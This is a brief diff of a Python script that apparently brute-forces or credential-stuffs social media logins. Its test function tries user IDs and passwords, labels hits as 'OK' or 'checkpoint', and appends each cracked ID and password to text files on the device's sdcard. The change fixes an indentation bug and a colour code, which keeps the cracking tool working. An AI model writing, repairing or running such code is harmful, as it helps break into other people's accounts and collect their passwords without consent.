@@ -143,14 +143,14 @@ def test(uid,pwx,tl):
                 if 'LOCK' in res:
                     return 'LOCK'
                 else:
-                print(f'\r\33[1;92m[RJ-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
+                    print(f'\r\33[1;92m[RJ-404-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                 oks.append(cid)
                 open('/sdcard/RJ-404-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f"\r\33[1;92m[RJ-404-CP] {uid} ¤ {ps}")
+                print(f"\r\33[1;36m[RJ-404-CP] {uid} ¤ {ps}")
                 open('/sdcard/RJ-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
